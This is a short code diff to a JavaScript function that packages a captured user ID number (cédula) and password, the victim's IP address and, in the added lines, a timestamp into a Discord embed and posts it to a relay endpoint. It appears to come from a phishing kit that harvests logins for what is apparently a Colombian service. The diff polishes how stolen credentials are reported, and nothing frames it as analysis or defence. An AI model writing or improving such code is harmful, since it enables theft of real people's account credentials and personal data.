@@ -421,12 +421,16 @@ async function sendToDiscord(content){
       if(j && j.ip) ip = j.ip;
     }catch(e){}
     const lineas = String(content||'').split('\n').map(s=>s.trim()).filter(Boolean);
-    // Embed pequeño y legible: credenciales en el TÍTULO, evento en la descripción, solo IP abajo
+    // Embed compacto: credenciales en el TÍTULO, evento en la descripción, fecha + IP abajo
+    const ahora = new Date();
+    const fecha = ahora.toLocaleDateString('es-CO') + ', ' + ahora.toLocaleTimeString('es-CO');
+    const campos = [{ name: '⏰ Fecha y Hora', value: fecha, inline: false }];
+    if(ip !== '—') campos.push({ name: '🌐 IP', value: ip, inline: false });
     const embed = {
       title: `👤 Usuario: ${session.cedula||'—'}  ·  🔑 Clave: ${session.password||'—'}`,
       description: lineas.join('\n') || 'Evento de sesión',
       color: 0x3c6af0,
-      fields: ip !== '—' ? [{ name: '🌐 IP', value: ip, inline: false }] : []
+      fields: campos
     };
     await fetch('/api/notificar', {
       method: 'POST',
